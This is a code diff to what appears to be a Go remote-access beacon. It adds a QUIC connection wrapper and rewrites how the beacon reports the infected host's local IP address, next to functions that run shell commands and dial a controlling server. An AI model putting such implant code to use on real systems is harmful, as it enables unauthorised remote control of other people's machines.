@@ -126,6 +126,20 @@ func RunShellCommand(command string) string {
 	return string(output)
 }
 
+type quicBeacon struct {
+	quic.Stream
+	conn quic.Connection
+}
+
+func (b *quicBeacon) LocalAddr() net.Addr {
+	return b.conn.LocalAddr()
+}
+
+func (b *quicBeacon) Close() error {
+	_ = b.Stream.Close()
+	return b.conn.CloseWithError(0, "")
+}
+
 func EstablishConnection(config *tls.Config, ServerIP, ServerPort, TransportProtocol string) (io.ReadWriteCloser, error) {
 	address := fmt.Sprintf("%s:%s", ServerIP, ServerPort)
 
@@ -140,7 +154,11 @@ func EstablishConnection(config *tls.Config, ServerIP, ServerPort, TransportProt
 		if err != nil {
 			return nil, fmt.Errorf("QUIC stream failed: %w", err)
 		}
-		return stream, nil
+
+		return &quicBeacon{
+			Stream: stream,
+			conn:   session,
+		}, nil
 
 	case "TCP":
 		logger.Logf(logger.Info, "Dialing TCP %v", address)
@@ -156,15 +174,32 @@ func EstablishConnection(config *tls.Config, ServerIP, ServerPort, TransportProt
 }
 
 func GetLocalIP(beacon io.ReadWriteCloser) string {
-	if conn, ok := beacon.(interface{ LocalAddr() net.Addr }); ok {
-		if addr, ok := conn.LocalAddr().(*net.IPAddr); ok {
-			return addr.IP.String()
-		}
-		if addr, ok := conn.LocalAddr().(*net.UDPAddr); ok {
-			return addr.IP.String()
-		}
-		if addr, ok := conn.LocalAddr().(*net.TCPAddr); ok {
-			return addr.IP.String()
+	type localAddresser interface {
+		LocalAddr() net.Addr
+	}
+
+	la, ok := beacon.(localAddresser)
+	if !ok {
+		return "unknown"
+	}
+
+	addr := la.LocalAddr()
+	if addr == nil {
+		return "unknown"
+	}
+
+	switch a := addr.(type) {
+	case *net.TCPAddr:
+		return a.IP.String()
+	case *net.UDPAddr:
+		return a.IP.String()
+	case *net.IPAddr:
+		return a.IP.String()
+	default:
+		// Fallback: parse "IP:port"
+		host, _, err := net.SplitHostPort(addr.String())
+		if err == nil {
+			return host
 		}
 	}
 	return "unknown"
